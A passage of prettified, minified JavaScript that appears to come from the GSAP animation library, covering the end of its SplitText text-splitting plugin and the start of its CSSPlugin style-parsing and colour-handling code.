83D[\uDC6E\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3D\uDD3E\uDDD6-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])|(?:[\u261D\u270A-\u270D]|\uD83C[\uDF85\uDFC2\uDFC7]|\uD83D[\uDC42\uDC43\uDC46-\uDC50\uDC66\uDC67\uDC70\uDC72\uDC74-\uDC76\uDC78\uDC7C\uDC83\uDC85\uDCAA\uDD74\uDD7A\uDD90\uDD95\uDD96\uDE4C\uDE4F\uDEC0\uDECC]|\uD83E[\uDD18-\uDD1C\uDD1E\uDD1F\uDD30-\uDD36\uDDD1-\uDDD5])(?:\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC68(?:\u200D(?:(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC67|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC66)|\uD83C[\uDFFB-\uDFFF])|(?:[\u261D\u26F9\u270A-\u270D]|\uD83C[\uDF85\uDFC2-\uDFC4\uDFC7\uDFCA-\uDFCC]|\uD83D[\uDC42\uDC43\uDC46-\uDC50\uDC66-\uDC69\uDC6E\uDC70-\uDC78\uDC7C\uDC81-\uDC83\uDC85-\uDC87\uDCAA\uDD74\uDD75\uDD7A\uDD90\uDD95\uDD96\uDE45-\uDE47\uDE4B-\uDE4F\uDEA3\uDEB4-\uDEB6\uDEC0\uDECC]|\uD83E[\uDD18-\uDD1C\uDD1E\uDD1F\uDD26\uDD30-\uDD39\uDD3D\uDD3E\uDDD1-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])?|(?:[\u231A\u231B\u23E9-\u23EC\u23F0\u23F3\u25FD\u25FE\u2614\u2615\u2648-\u2653\u267F\u2693\u26A1\u26AA\u26AB\u26BD\u26BE\u26C4\u26C5\u26CE\u26D4\u26EA\u26F2\u26F3\u26F5\u26FA\u26FD\u2705\u270A\u270B\u2728\u274C\u274E\u2753-\u2755\u2757\u2795-\u2797\u27B0\u27BF\u2B1B\u2B1C\u2B50\u2B55]|\uD83C[\uDC04\uDCCF\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE1A\uDE2F\uDE32-\uDE36\uDE38-\uDE3A\uDE50\uDE51\uDF00-\uDF20\uDF2D-\uDF35\uDF37-\uDF7C\uDF7E-\uDF93\uDFA0-\uDFCA\uDFCF-\uDFD3\uDFE0-\uDFF0\uDFF4\uDFF8-\uDFFF]|\uD83D[\uDC00-\uDC3E\uDC40\uDC42-\uDCFC\uDCFF-\uDD3D\uDD4B-\uDD4E\uDD50-\uDD67\uDD7A\uDD95\uDD96\uDDA4\uDDFB-\uDE4F\uDE80-\uDEC5\uDECC\uDED0-\uDED2\uDEEB\uDEEC\uDEF4-\uDEF8]|\uD83E[\uDD10-\uDD3A\uDD3C-\uDD3E\uDD40-\uDD45\uDD47-\uDD4C\uDD50-\uDD6B\uDD80-\uDD97\uDDC0\uDDD0-\uDDE6])|(?:[#\*0-9\xA9\xAE\u203C\u2049\u2122\u2139\u2194-\u2199\u21A9\u21AA\u231A\u231B\u2328\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638-\u263A\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692-\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753-\u2755\u2757\u2763\u2764\u2795-\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05-\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]|\uD83C[\uDC04\uDCCF\uDD70\uDD71\uDD7E\uDD7F\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE02\uDE1A\uDE2F\uDE32-\uDE3A\uDE50\uDE51\uDF00-\uDF21\uDF24-\uDF93\uDF96\uDF97\uDF99-\uDF9B\uDF9E-\uDFF0\uDFF3-\uDFF5\uDFF7-\uDFFF]|\uD83D[\uDC00-\uDCFD\uDCFF-\uDD3D\uDD49-\uDD4E\uDD50-\uDD67\uDD6F\uDD70\uDD73-\uDD7A\uDD87\uDD8A-\uDD8D\uDD90\uDD95\uDD96\uDDA4\uDDA5\uDDA8\uDDB1\uDDB2\uDDBC\uDDC2-\uDDC4\uDDD1-\uDDD3\uDDDC-\uDDDE\uDDE1\uDDE3\uDDE8\uDDEF\uDDF3\uDDFA-\uDE4F\uDE80-\uDEC5\uDECB-\uDED2\uDEE0-\uDEE5\uDEE9\uDEEB\uDEEC\uDEF0\uDEF3-\uDEF8]|\uD83E[\uDD10-\uDD3A\uDD3C-\uDD3E\uDD40-\uDD45\uDD47-\uDD4C\uDD50-\uDD6B\uDD80-\uDD97\uDDC0\uDDD0-\uDDE6])\uFE0F)/;
    function i(t) {
      return _.getComputedStyle(t);
    }
    function r(t, e) {
      var i;
      return v(t)
        ? t
        : "string" == (i = typeof t) && !e && t
        ? x.call(D.querySelectorAll(t), 0)
        : t && "object" == i && "length" in t
        ? x.call(t, 0)
        : t
        ? [t]
        : [];
    }
    function n(t) {
      return "absolute" === t.position || !0 === t.absolute;
    }
    function s(t, e) {
      for (var i, r = e.length; -1 < --r; )
        if (((i = e[r]), t.substr(0, i.length) === i)) return i.length;
    }
    function o(t, e) {
      void 0 === t && (t = "");
      var i = ~t.indexOf("++"),
        r = 1;
      return (
        i && (t = t.split("++").join("")),
        function () {
          return (
            "<" +
            e +
            " style='position:relative;display:inline-block;'" +
            (t ? " class='" + t + (i ? r++ : "") + "'>" : ">")
          );
        }
      );
    }
    function a(t, e, i) {
      var r = t.nodeType;
      if (1 === r || 9 === r || 11 === r)
        for (t = t.firstChild; t; t = t.nextSibling) a(t, e, i);
      else (3 !== r && 4 !== r) || (t.nodeValue = t.nodeValue.split(e).join(i));
    }
    function u(t, e) {
      for (var i = e.length; -1 < --i; ) t.push(e[i]);
    }
    function l(t, e, i) {
      for (var r; t && t !== e; ) {
        if ((r = t._next || t.nextSibling))
          return r.textContent.charAt(0) === i;
        t = t.parentNode || t._parent;
      }
    }
    function h(t) {
      var e,
        i,
        n = r(t.childNodes),
        s = n.length;
      for (e = 0; e < s; e++)
        (i = n[e])._isSplit
          ? h(i)
          : (e && 3 === i.previousSibling.nodeType
              ? (i.previousSibling.nodeValue +=
                  3 === i.nodeType ? i.nodeValue : i.firstChild.nodeValue)
              : 3 !== i.nodeType && t.insertBefore(i.firstChild, i),
            t.removeChild(i));
    }
    function p(t, e) {
      return parseFloat(e[t]) || 0;
    }
    function f(t, e, r, s, o, f, c) {
      var _,
        d,
        m,
        g,
        y,
        v,
        x,
        C,
        F,
        T,
        w,
        b,
        E = i(t),
        P = p("paddingLeft", E),
        O = -999,
        S = p("borderBottomWidth", E) + p("borderTopWidth", E),
        A = p("borderLeftWidth", E) + p("borderRightWidth", E),
        k = p("paddingTop", E) + p("paddingBottom", E),
        R = p("paddingLeft", E) + p("paddingRight", E),
        B = 0.2 * p("fontSize", E),
        M = E.textAlign,
        I = [],
        N = [],
        L = [],
        X = e.wordDelimiter || " ",
        z = e.tag ? e.tag : e.span ? "span" : "div",
        Y = e.type || e.split || "chars,words,lines",
        j = o && ~Y.indexOf("lines") ? [] : null,
        V = ~Y.indexOf("words"),
        W = ~Y.indexOf("chars"),
        U = n(e),
        q = e.linesClass,
        H = ~(q || "").indexOf("++"),
        G = [];
      for (
        H && (q = q.split("++").join("")),
          m = (d = t.getElementsByTagName("*")).length,
          y = [],
          _ = 0;
        _ < m;
        _++
      )
        y[_] = d[_];
      if (j || U)
        for (_ = 0; _ < m; _++)
          ((v = (g = y[_]).parentNode === t) || U || (W && !V)) &&
            ((b = g.offsetTop),
            j &&
              v &&
              Math.abs(b - O) > B &&
              ("BR" !== g.nodeName || 0 === _) &&
              ((x = []), j.push(x), (O = b)),
            U &&
              ((g._x = g.offsetLeft),
              (g._y = b),
              (g._w = g.offsetWidth),
              (g._h = g.offsetHeight)),
            j &&
              (((g._isSplit && v) ||
                (!W && v) ||
                (V && v) ||
                (!V &&
                  g.parentNode.parentNode === t &&
                  !g.parentNode._isSplit)) &&
                (x.push(g), (g._x -= P), l(g, t, X) && (g._wordEnd = !0)),
              "BR" === g.nodeName &&
                ((g.nextSibling && "BR" === g.nextSibling.nodeName) ||
                  0 === _) &&
                j.push([])));
      for (_ = 0; _ < m; _++)
        (v = (g = y[_]).parentNode === t),
          "BR" !== g.nodeName
            ? (U &&
                ((F = g.style),
                V ||
                  v ||
                  ((g._x += g.parentNode._x), (g._y += g.parentNode._y)),
                (F.left = g._x + "px"),
                (F.top = g._y + "px"),
                (F.position = "absolute"),
                (F.display = "block"),
                (F.width = g._w + 1 + "px"),
                (F.height = g._h + "px")),
              !V && W
                ? g._isSplit
                  ? ((g._next = g.nextSibling), g.parentNode.appendChild(g))
                  : g.parentNode._isSplit
                  ? ((g._parent = g.parentNode),
                    !g.previousSibling &&
                      g.firstChild &&
                      (g.firstChild._isFirst = !0),
                    g.nextSibling &&
                      " " === g.nextSibling.textContent &&
                      !g.nextSibling.nextSibling &&
                      G.push(g.nextSibling),
                    (g._next =
                      g.nextSibling && g.nextSibling._isFirst
                        ? null
                        : g.nextSibling),
                    g.parentNode.removeChild(g),
                    y.splice(_--, 1),
                    m--)
                  : v ||
                    ((b = !g.nextSibling && l(g.parentNode, t, X)),
                    g.parentNode._parent && g.parentNode._parent.appendChild(g),
                    b && g.parentNode.appendChild(D.createTextNode(" ")),
                    "span" === z && (g.style.display = "inline"),
                    I.push(g))
                : g.parentNode._isSplit && !g._isSplit && "" !== g.innerHTML
                ? N.push(g)
                : W &&
                  !g._isSplit &&
                  ("span" === z && (g.style.display = "inline"), I.push(g)))
            : j || U
            ? (g.parentNode && g.parentNode.removeChild(g),
              y.splice(_--, 1),
              m--)
            : V || t.appendChild(g);
      for (_ = G.length; -1 < --_; ) G[_].parentNode.removeChild(G[_]);
      if (j) {
        for (
          U &&
            ((T = D.createElement(z)),
            t.appendChild(T),
            (w = T.offsetWidth + "px"),
            (b = T.offsetParent === t ? 0 : t.offsetLeft),
            t.removeChild(T)),
            F = t.style.cssText,
            t.style.cssText = "display:none;";
          t.firstChild;

        )
          t.removeChild(t.firstChild);
        for (C = " " === X && (!U || (!V && !W)), _ = 0; _ < j.length; _++) {
          for (
            x = j[_],
              (T = D.createElement(z)).style.cssText =
                "display:block;text-align:" +
                M +
                ";position:" +
                (U ? "absolute;" : "relative;"),
              q && (T.className = q + (H ? _ + 1 : "")),
              L.push(T),
              m = x.length,
              d = 0;
            d < m;
            d++
          )
            "BR" !== x[d].nodeName &&
              ((g = x[d]),
              T.appendChild(g),
              C && g._wordEnd && T.appendChild(D.createTextNode(" ")),
              U &&
                (0 === d &&
                  ((T.style.top = g._y + "px"), (T.style.left = P + b + "px")),
                (g.style.top = "0px"),
                b && (g.style.left = g._x - b + "px")));
          0 === m
            ? (T.innerHTML = "&nbsp;")
            : V || W || (h(T), a(T, String.fromCharCode(160), " ")),
            U && ((T.style.width = w), (T.style.height = g._h + "px")),
            t.appendChild(T);
        }
        t.style.cssText = F;
      }
      U &&
        (c > t.clientHeight &&
          ((t.style.height = c - k + "px"),
          t.clientHeight < c && (t.style.height = c + S + "px")),
        f > t.clientWidth &&
          ((t.style.width = f - R + "px"),
          t.clientWidth < f && (t.style.width = f + A + "px"))),
        u(r, I),
        V && u(s, N),
        u(o, L);
    }
    function c(t, o, u, l) {
      var h,
        p,
        f = r(t.childNodes),
        _ = f.length,
        d = n(o);
      if (3 !== t.nodeType || 1 < _) {
        for (o.absolute = !1, h = 0; h < _; h++)
          (3 === (p = f[h]).nodeType && !/\S+/.test(p.nodeValue)) ||
            (d &&
              3 !== p.nodeType &&
              "inline" === i(p).display &&
              ((p.style.display = "inline-block"),
              (p.style.position = "relative")),
            (p._isSplit = !0),
            c(p, o, u, l));
        return (o.absolute = d), void (t._isSplit = !0);
      }
      !(function (t, i, r, o) {
        var u,
          l,
          h,
          p,
          f,
          c,
          _,
          d,
          m = i.tag ? i.tag : i.span ? "span" : "div",
          v = ~(i.type || i.split || "chars,words,lines").indexOf("chars"),
          x = n(i),
          C = i.wordDelimiter || " ",
          F = " " !== C ? "" : x ? "&#173; " : " ",
          T = "</" + m + ">",
          w = 1,
          b = i.specialChars
            ? "function" == typeof i.specialChars
              ? i.specialChars
              : s
            : null,
          E = D.createElement("div"),
          P = t.parentNode;
        for (
          P.insertBefore(E, t),
            E.textContent = t.nodeValue,
            P.removeChild(t),
            _ =
              -1 !==
              (u = (function t(e) {
                var i = e.nodeType,
                  r = "";
                if (1 === i || 9 === i || 11 === i) {
                  if ("string" == typeof e.textContent) return e.textContent;
                  for (e = e.firstChild; e; e = e.nextSibling) r += t(e);
                } else if (3 === i || 4 === i) return e.nodeValue;
                return r;
              })((t = E))).indexOf("<"),
            !1 !== i.reduceWhiteSpace && (u = u.replace(y, " ").replace(g, "")),
            _ && (u = u.split("<").join("{{LT}}")),
            f = u.length,
            l = (" " === u.charAt(0) ? F : "") + r(),
            h = 0;
          h < f;
          h++
        )
          if (((c = u.charAt(h)), b && (d = b(u.substr(h), i.specialChars))))
            (c = u.substr(h, d || 1)),
              (l += v && " " !== c ? o() + c + "</" + m + ">" : c),
              (h += d - 1);
          else if (c === C && u.charAt(h - 1) !== C && h) {
            for (l += w ? T : "", w = 0; u.charAt(h + 1) === C; ) (l += F), h++;
            h === f - 1
              ? (l += F)
              : ")" !== u.charAt(h + 1) && ((l += F + r()), (w = 1));
          } else
            "{" === c && "{{LT}}" === u.substr(h, 6)
              ? ((l += v ? o() + "{{LT}}</" + m + ">" : "{{LT}}"), (h += 5))
              : (55296 <= c.charCodeAt(0) && c.charCodeAt(0) <= 56319) ||
                (65024 <= u.charCodeAt(h + 1) && u.charCodeAt(h + 1) <= 65039)
              ? ((p = ((u.substr(h, 12).split(e) || [])[1] || "").length || 2),
                (l +=
                  v && " " !== c
                    ? o() + u.substr(h, p) + "</" + m + ">"
                    : u.substr(h, p)),
                (h += p - 1))
              : (l += v && " " !== c ? o() + c + "</" + m + ">" : c);
        (t.outerHTML = l + (w ? T : "")), _ && a(P, "{{LT}}", "<");
      })(t, o, u, l);
    }
    var D,
      _,
      d,
      m,
      g = /(?:\r|\n|\t\t)/g,
      y = /(?:\s\s+)/g,
      v = Array.isArray,
      x = [].slice,
      C =
        (((m = F.prototype).split = function (t) {
          this.isSplit && this.revert(),
            (this.vars = t = t || this.vars),
            (this._originals.length =
              this.chars.length =
              this.words.length =
              this.lines.length =
                0);
          for (
            var e,
              i,
              r,
              n = this.elements.length,
              s = t.tag ? t.tag : t.span ? "span" : "div",
              a = o(t.wordsClass, s),
              u = o(t.charsClass, s);
            -1 < --n;

          )
            (r = this.elements[n]),
              (this._originals[n] = r.innerHTML),
              (e = r.clientHeight),
              (i = r.clientWidth),
              c(r, t, a, u),
              f(r, t, this.chars, this.words, this.lines, i, e);
          return (
            this.chars.reverse(),
            this.words.reverse(),
            this.lines.reverse(),
            (this.isSplit = !0),
            this
          );
        }),
        (m.revert = function () {
          var t = this._originals;
          if (!t) throw "revert() call wasn't scoped properly.";
          return (
            this.elements.forEach(function (e, i) {
              return (e.innerHTML = t[i]);
            }),
            (this.chars = []),
            (this.words = []),
            (this.lines = []),
            (this.isSplit = !1),
            this
          );
        }),
        (F.create = function (t, e) {
          return new F(t, e);
        }),
        F);
    function F(t, e) {
      d || ((D = document), (_ = window), (d = 1)),
        (this.elements = r(t)),
        (this.chars = []),
        (this.words = []),
        (this.lines = []),
        (this._originals = []),
        (this.vars = e || {}),
        this.split(e);
    }
    (C.version = "3.0.0"),
      (t.SplitText = C),
      (t.default = C),
      Object.defineProperty(t, "__esModule", { value: !0 });
  }),
  (
    (_gsScope =
      "undefined" != typeof module &&
      module.exports &&
      "undefined" != typeof global
        ? global
        : this || window)._gsQueue || (_gsScope._gsQueue = [])
  ).push(function () {
    "use strict";
    _gsScope._gsDefine(
      "plugins.CSSPlugin",
      ["plugins.TweenPlugin", "TweenLite"],
      function (t, e) {
        var i,
          r,
          n,
          s,
          o = function () {
            t.call(this, "css"),
              (this._overwriteProps.length = 0),
              (this.setRatio = o.prototype.setRatio);
          },
          a = _gsScope._gsDefine.globals,
          u = {},
          l = (o.prototype = new t("css"));
        function h(t, e) {
          return e.toUpperCase();
        }
        function p(t, e) {
          return e && et.createElementNS
            ? et.createElementNS(e, t)
            : et.createElement(t);
        }
        function f(t) {
          return X.test(
            "string" == typeof t
              ? t
              : (t.currentStyle ? t.currentStyle.filter : t.style.filter) || ""
          )
            ? parseFloat(RegExp.$1) / 100
            : 1;
        }
        function c(t) {
          _gsScope.console && console.log(t);
        }
        function D(t, e) {
          var i,
            r,
            n = (e = e || it).style;
          if (void 0 !== n[t]) return t;
          for (
            t = t.charAt(0).toUpperCase() + t.substr(1),
              i = ["O", "Moz", "ms", "Ms", "Webkit"],
              r = 5;
            -1 < --r && void 0 === n[i[r] + t];

          );
          return 0 <= r
            ? ((at = "-" + (ut = 3 === r ? "ms" : i[r]).toLowerCase() + "-"),
              ut + t)
            : null;
        }
        function _(t) {
          return lt.getComputedStyle(t);
        }
        function d(t, e) {
          var i,
            r,
            n,
            s = {};
          if ((e = e || _(t)))
            if ((i = e.length))
              for (; -1 < --i; )
                (-1 !== (n = e[i]).indexOf("-transform") && Xt !== n) ||
                  (s[n.replace(W, h)] = e.getPropertyValue(n));
            else
              for (i in e)
                (-1 !== i.indexOf("Transform") && Lt !== i) || (s[i] = e[i]);
          else if ((e = t.currentStyle || t.style))
            for (i in e)
              "string" == typeof i &&
                void 0 === s[i] &&
                (s[i.replace(W, h)] = e[i]);
          return (
            ot || (s.opacity = f(t)),
            (r = Zt(t, e, !1)),
            (s.rotation = r.rotation),
            (s.skewX = r.skewX),
            (s.scaleX = r.scaleX),
            (s.scaleY = r.scaleY),
            (s.x = r.x),
            (s.y = r.y),
            Yt &&
              ((s.z = r.z),
              (s.rotationX = r.rotationX),
              (s.rotationY = r.rotationY),
              (s.scaleZ = r.scaleZ)),
            s.filters && delete s.filters,
            s
          );
        }
        function m(t, e, i, r, n) {
          var s,
            o,
            a,
            u = {},
            l = t.style;
          for (o in i)
            "cssText" !== o &&
              "length" !== o &&
              isNaN(o) &&
              (e[o] !== (s = i[o]) || (n && n[o])) &&
              -1 === o.indexOf("Origin") &&
              ("number" == typeof s || "string" == typeof s) &&
              ((u[o] =
                "auto" !== s || ("left" !== o && "top" !== o)
                  ? ("" !== s && "auto" !== s && "none" !== s) ||
                    "string" != typeof e[o] ||
                    "" === e[o].replace(N, "")
                    ? s
                    : 0
                  : ft(t, o)),
              void 0 !== l[o] && (a = new Ct(l, o, l[o], a)));
          if (r) for (o in r) "className" !== o && (u[o] = r[o]);
          return { difs: u, firstMPT: a };
        }
        function g(t, e, i) {
          if ("svg" === (t.nodeName + "").toLowerCase())
            return (i || _(t))[e] || 0;
          if (t.getCTM && Ht(t)) return t.getBBox()[e] || 0;
          var r = parseFloat("width" === e ? t.offsetWidth : t.offsetHeight),
            n = ct[e],
            s = n.length;
          for (i = i || _(t); -1 < --s; )
            (r -= parseFloat(ht(t, "padding" + n[s], i, !0)) || 0),
              (r -= parseFloat(ht(t, "border" + n[s] + "Width", i, !0)) || 0);
          return r;
        }
        function y(t, e) {
          return (
            "function" == typeof t && (t = t(A, S)),
            "string" == typeof t && "=" === t.charAt(1)
              ? parseInt(t.charAt(0) + "1", 10) * parseFloat(t.substr(2))
              : parseFloat(t) - parseFloat(e) || 0
          );
        }
        function v(t, e) {
          "function" == typeof t && (t = t(A, S));
          var i = "string" == typeof t && "=" === t.charAt(1);
          return (
            "string" == typeof t &&
              "v" === t.charAt(t.length - 2) &&
              (t =
                (i ? t.substr(0, 2) : 0) +
                window["inner" + ("vh" === t.substr(-2) ? "Height" : "Width")] *
                  (parseFloat(i ? t.substr(2) : t) / 100)),
            null == t
              ? e
              : i
              ? parseInt(t.charAt(0) + "1", 10) * parseFloat(t.substr(2)) + e
              : parseFloat(t) || 0
          );
        }
        function x(t, e, i, r) {
          var n, s, o, a, u;
          return (
            "function" == typeof t && (t = t(A, S)),
            (a =
              null == t
                ? e
                : "number" == typeof t
                ? t
                : ((n = 360),
                  (s = t.split("_")),
                  (o =
                    ((u = "=" === t.charAt(1))
                      ? parseInt(t.charAt(0) + "1", 10) *
                        parseFloat(s[0].substr(2))
                      : parseFloat(s[0])) *
                      (-1 === t.indexOf("rad") ? 1 : K) -
                    (u ? 0 : e)),
                  s.length &&
                    (r && (r[i] = e + o),
                    -1 !== t.indexOf("short") &&
                      (o %= n) != o % 180 &&
                      (o = o < 0 ? o + n : o - n),
                    -1 !== t.indexOf("_cw") && o < 0
                      ? (o = ((o + 3599999999640) % n) - ((o / n) | 0) * n)
                      : -1 !== t.indexOf("ccw") &&
                        0 < o &&
                        (o = ((o - 3599999999640) % n) - ((o / n) | 0) * n)),
                  e + o)) < 1e-6 &&
              -1e-6 < a &&
              (a = 0),
            a
          );
        }
        function C(t, e, i) {
          return (
            (255 *
              (6 * (t = t < 0 ? t + 1 : 1 < t ? t - 1 : t) < 1
                ? e + (i - e) * t * 6
                : t < 0.5
                ? i
                : 3 * t < 2
                ? e + (i - e) * (2 / 3 - t) * 6
                : e) +
              0.5) |
            0
          );
        }
        function F(t, e) {
          var i,
            r,
            n,
            s = t.match(gt) || [],
            o = 0,
            a = "";
          if (!s.length) return t;
          for (i = 0; i < s.length; i++)
            (r = s[i]),
              (o += (n = t.substr(o, t.indexOf(r, o) - o)).length + r.length),
              3 === (r = mt(r, e)).length && r.push(1),
              (a +=
                n +
                (e
                  ? "hsla(" + r[0] + "," + r[1] + "%," + r[2] + "%," + r[3]
                  : "rgba(" + r.join(",")) +
                ")");
          return a + t.substr(o);
        }
        ((l.constructor = o).version = "2.1.0"),
          (o.API = 2),
          (o.defaultTransformPerspective = 0),
          (o.defaultSkewType = "compensated"),
          (o.defaultSmoothOrigin = !0),
          (l = "px"),
          (o.suffixMap = {
            top: l,
            right: l,
            bottom: l,
            left: l,
            width: l,
            height: l,
            fontSize: l,
            padding: l,
            margin: l,
            perspective: l,
            lineHeight: "",
          });
        var T,
          w,
          b,
          E,
          P,
          O,
          S,
          A,
          k,
          R,
          B = /(?:\-|\.|\b)(\d|\.|e\-)+/g,
          M = /(?:\d|\-\d|\.\d|\-\.\d|\+=\d|\-=\d|\+=.\d|\-=\.\d)+/g,
          I = /(?:\+=|\-=|\-|\b)[\d\-\.]+[a-zA-Z0-9]*(?:%|\b)/gi,
          N = /(?![+-]?\d*\.?\d+|[+-]|e[+-]\d+)[^0-9]/g,
          L = /(?:\d|\-|\+|=|#|\.)*/g,
          X = /opacity *= *([^)]*)/i,
          z = /opacity:([^;]*)/i,
          Y = /alpha\(opacity *=.+?\)/i,
          j = /^(rgb|hsl)/,
          V = /([A-Z])/g,
          W = /-([a-z])/gi,
          U = /(^(?:url\(\"|url\())|(?:(\"\))$|\)$)/gi,
          q = /(?:Left|Right|Width)/i,
          H = /(M11|M12|M21|M22)=[\d\-\.e]+/gi,
          G = /progid\:DXImageTransform\.Microsoft\.Matrix\(.+?\)/i,
          Q = /,(?=[^\)]*(?:\(|$))/gi,
          Z = /[\s,\(]/i,
          $ = Math.PI / 180,
          K = 180 / Math.PI,
          J = {},
          tt = { style: {} },
          et = _gsScope.document || {
            createElement: function () {
              return tt;
            },
          },
          it = p("div"),
          rt = p("img"),
          nt = (o._internals = { _specialProps: u }),
          st = (_gsScope.navigator || {}).userAgent || "",
          ot =
            ((k = st.indexOf("Android")),
            (R = p("a")),
            (b =
              -1 !== st.indexOf("Safari") &&
              -1 === st.indexOf("Chrome") &&
              (-1 === k || 3 < parseFloat(st.substr(k + 8, 2)))),
            (P = b && parseFloat(st.substr(st.indexOf("Version/") + 8, 2)) < 6),
            (E = -1 !== st.indexOf("Firefox")),
            (/MSIE ([0-9]{1,}[\.0-9]{0,})/.exec(st) ||
              /Trident\/.*rv:([0-9]{1,}[\.0-9]{0,})/.exec(st)) &&
              (O = parseFloat(RegExp.$1)),
            !!R &&
              ((R.style.cssText = "top:1px;opacity:.55;"),
              /^0.55/.test(R.style.opacity))),
          at = "",
          ut = "",
          lt =
            "undefined" != typeof window
              ? window
              : et.defaultView || { getComputedStyle: function () {} },
          ht = (o.getStyle = function (t, e, i, r, n) {
            var s;
            return ot || "opacity" !== e
              ? (!r && t.style[e]
                  ? (s = t.style[e])
                  : (i = i || _(t))
                  ? (s =
                      i[e] ||
                      i.getPropertyValue(e) ||
                      i.getPropertyValue(e.replace(V, "-$1").toLowerCase()))
                  : t.currentStyle && (s = t.currentStyle[e]),
                null == n ||
                (s && "none" !== s && "auto" !== s && "auto auto" !== s)
                  ? s
                  : n)
              : f(t);
          }),
          pt = (nt.convertToPixels = function (t, i, r, n, s) {
            if ("px" === n || (!n && "lineHeight" !== i)) return r;
            if ("auto" === n || !r) return 0;
            var a,
              u,
              l,
              h = q.test(i),
              p = t,
              f = it.style,
              c = r < 0,
              D = 1 === r;
            if ((c && (r = -r), D && (r *= 100), "lineHeight" !== i || n))
              if ("%" === n && -1 !== i.indexOf("border"))
                a = (r / 100) * (h ? t.clientWidth : t.clientHeight);
              else {
                if (
                  ((f.cssText =
                    "border:0 solid red;position:" +
                    ht(t, "position") +
                    ";line-height:0;"),
                  "%" !== n &&
                    p.appendChild &&
                    "v" !== n.charAt(0) &&
                    "rem" !== n)
                )
                  f[h ? "borderLeftWidth" : "borderTopWidth"] = r + n;
                else {
                  if (
                    ((p = t.parentNode || et.body),
                    -1 !== ht(p, "display").indexOf("flex") &&
                      (f.position = "absolute"),
                    (u = p._gsCache),
                    (l = e.ticker.frame),
                    u && h && u.time === l)
                  )
                    return (u.width * r) / 100;
                  f[h ? "width" : "height"] = r + n;
                }
                p.appendChild(it),
                  (a = parseFloat(it[h ? "offsetWidth" : "offsetHeight"])),
                  p.removeChild(it),
                  h &&
                    "%" === n &&
                    !1 !== o.cacheWidths &&
                    (((u = p._gsCache = p._gsCache || {}).time = l),
                    (u.width = (a / r) * 100)),
                  0 !== a || s || (a = pt(t, i, r, n, !0));
              }
            else
              (u = _(t).lineHeight),
                (t.style.lineHeight = r),
                (a = parseFloat(_(t).lineHeight)),
                (t.style.lineHeight = u);
            return D && (a /= 100), c ? -a : a;
          }),
          ft = (nt.calculateOffset = function (t, e, i) {
            if ("absolute" !== ht(t, "position", i)) return 0;
            var r = "left" === e ? "Left" : "Top",
              n = ht(t, "margin" + r, i);
            return (
              t["offset" + r] - (pt(t, e, parseFloat(n), n.replace(L, "")) || 0)
            );
          }),
          ct = { width: ["Left", "Right"], height: ["Top", "Bottom"] },
          Dt = ["marginLeft", "marginRight", "marginTop", "marginBottom"],
          _t = function (t, e) {
            if ("contain" === t || "auto" === t || "auto auto" === t)
              return t + " ";
            (null != t && "" !== t) || (t = "0 0");
            var i,
              r = t.split(" "),
              n =
                -1 !== t.indexOf("left")
                  ? "0%"
                  : -1 !== t.indexOf("right")
                  ? "100%"
                  : r[0],
              s =
                -1 !== t.indexOf("top")
                  ? "0%"
                  : -1 !== t.indexOf("bottom")
                  ? "100%"
                  : r[1];
            if (3 < r.length && !e) {
              for (
                r = t.split(", ").join(",").split(","), t = [], i = 0;
                i < r.length;
                i++
              )
                t.push(_t(r[i]));
              return t.join(",");
            }
            return (
              null == s
                ? (s = "center" === n ? "50%" : "0")
                : "center" === s && (s = "50%"),
              ("center" === n ||
                (isNaN(parseFloat(n)) && -1 === (n + "").indexOf("="))) &&
                (n = "50%"),
              (t = n + " " + s + (2 < r.length ? " " + r[2] : "")),
              e &&
                ((e.oxp = -1 !== n.indexOf("%")),
                (e.oyp = -1 !== s.indexOf("%")),
                (e.oxr = "=" === n.charAt(1)),
                (e.oyr = "=" === s.charAt(1)),
                (e.ox = parseFloat(n.replace(N, ""))),
                (e.oy = parseFloat(s.replace(N, ""))),
                (e.v = t)),
              e || t
            );
          },
          dt = {
            aqua: [0, 255, 255],
            lime: [0, 255, 0],
            silver: [192, 192, 192],
            black: [0, 0, 0],
            maroon: [128, 0, 0],
            teal: [0, 128, 128],
            blue: [0, 0, 255],
            navy: [0, 0, 128],
            white: [255, 255, 255],
            fuchsia: [255, 0, 255],
            olive: [128, 128, 0],
            yellow: [255, 255, 0],
            orange: [255, 165, 0],
            gray: [128, 128, 128],
            purple: [128, 0, 128],
            green: [0, 128, 0],
            red: [255, 0, 0],
            pink: [255, 192, 203],
            cyan: [0, 255, 255],
            transparent: [255, 255, 255, 0],
          },
          mt = (o.parseColor = function (t, e) {
            var i, r, n, s, o, a, u, l, h, p, f;
            if (t)
              if ("number" == typeof t) i = [t >> 16, (t >> 8) & 255, 255 & t];
              else {
                if (
                  ("," === t.charAt(t.length - 1) &&
                    (t = t.substr(0, t.length - 1)),
                  dt[t])
                )
                  i = dt[t];
                else if ("#" === t.charAt(0))
                  4 === t.length &&
                    (t =
                      "#" +
                      (r = t.charAt(1)) +
                      r +
                      (n = t.charAt(2)) +
                      n +
                      (s = t.charAt(3)) +
                      s),
